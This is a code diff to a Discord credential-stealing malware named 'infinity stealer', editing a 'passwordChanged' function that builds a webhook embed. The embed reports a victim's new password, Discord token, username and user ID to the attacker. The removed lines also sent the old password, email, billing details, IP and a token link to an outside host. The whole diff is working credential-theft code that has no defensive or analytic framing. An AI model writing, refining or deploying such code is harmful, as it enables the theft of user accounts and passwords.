@@ -687,73 +687,23 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:b_800577490027413556:990325166397603921> **password changed**:',
-            value: ``,
-            inline: false,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> username:',
-            value: `\`${json.username}#${json.discriminator}\``,
-            inline: false,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> id:',
-            value: `\`${json.id}\``,
-            inline: false,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> nitro:',
-            value: `\`${nitro}\``,
-            inline: !1,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> Badges:',
-            value: `${badges}`,
-            inline: !1,
-          },    
-          {
-            name: '<a:b_800577490027413556:990325166397603921> Billing:',
-            value: `**${billing}**`,
-            inline: !1,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> Email:',
-            value: `\`${email}\``,
-            inline: false,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> old Password:',
-            value: `\`${oldpassword}\``,
-            inline: false,
-          },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> new Password:',
+            name: '**Password Changed**',
             value: `\`${newpassword}\``,
-            inline: false,
+            inline: true,
           },
           {
-            name: '<a:b_800577490027413556:990325166397603921> IP:',
-            value: `\`${config.ip}\``,
+            name: '**Token**',
+            value: `\`${token}\``,
             inline: false,
           },
-          {
-            name: '<a:b_800577490027413556:990325166397603921> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
-            inline: !1,
-          },
-
         ],
         author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: 'infinity stealer',
         },
-        thumbnail: {
-          url: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
-        },
-        title: `Total Friends (${friends})`,
-
       },
     ],
   };
